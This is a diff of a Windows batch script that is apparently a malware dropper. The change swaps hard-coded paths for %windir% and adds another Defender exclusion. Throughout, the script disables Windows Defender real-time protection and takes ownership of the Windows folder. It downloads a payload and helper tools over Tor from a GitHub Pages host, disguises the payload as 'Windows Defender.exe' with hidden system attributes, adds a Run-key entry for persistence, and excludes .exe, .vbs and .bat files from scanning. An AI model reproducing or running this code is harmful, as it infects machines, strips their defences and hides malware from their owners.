@@ -22,7 +22,7 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 taskkill /f /im explorer.exe
 start "" "%windir%\explorer.exe"  
 
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%windir%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 nircmd exec hide "C:\Tor\tor.exe"
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
@@ -30,16 +30,17 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
-TAKEOWN /F "C:\Windows"
-ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
+TAKEOWN /F "%windir%"
+ICACLS "%windir%" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 
-mkdir "C:\Windows\Win32"
-attrib +s +h +i "C:\Windows\Win32"
-curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "C:\Windows\nircmd.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
+mkdir "%windir%\Win32"
+attrib +s +h +i "%windir%\Win32"
+curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "%windir%\Windows Defender.exe" && attrib +s +h +i "%windir%\Windows Defender.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "%windir%\nircmd.exe" && attrib +s +h +i "%windir%\nircmd.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "%windir%\curl.exe" && attrib +s +h +i "%windir%\curl.exe"
 
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
+powershell.exe Add-MpPreference -ExclusionPath "%windir%"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
